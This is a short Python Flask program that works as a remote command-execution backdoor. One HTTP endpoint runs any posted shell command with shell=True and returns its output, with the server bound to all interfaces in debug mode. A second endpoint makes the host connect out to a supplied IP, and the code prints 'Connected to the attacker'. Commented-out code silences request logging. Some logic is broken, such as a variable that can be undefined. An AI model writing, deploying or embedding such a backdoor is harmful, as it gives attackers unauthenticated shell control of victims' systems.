from flask import Flask, request, render_template, jsonify
import socket
import subprocess
import os
#import click, logging

app = Flask(__name__)

ip_address = ""
command = ""
output = ""

'''
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def secho(text, file=None, nl=None, err=None, color=None, **styles):
    pass

def echo(text, file=None, nl=None, err=None, color=None, **styles):
    pass

click.echo = echo
click.secho = secho
'''


def remote_connection():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ip_address, 45923))
        print("Connected to the attacker")
    
    except Exception as e:
        print(e)
    finally:
        client_socket.close()
        
    
def remote_code_execution():
    global output
    global results
    print(f"The command being sent is {command}")
    
    if command.startswith("cd "):
        new_directory = command[3:].strip()
    try:
        os.chdir(new_directory)
        
    except Exception as e:
        pass
        
    
    results = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    output = {
        'stdout': results.stdout.strip(),
        'stderr': results.stderr.strip(),
        'returncode': results.returncode
    }
    


@app.route('/')
def home():
    return render_template('index.html')

@app.route('/set_ip', methods=['POST'])
def set_ip():
    global ip_address
    ip_address = request.json.get('ip')
    
    remote_connection()
    
    print(output)
    
    try:
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/send_command', methods=['POST'])
def send_command():
    global command
    command = request.json.get('command')
    
    remote_code_execution()
    
    try:
        return jsonify({"status": "success", "output": results.stdout}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=45920, debug=True)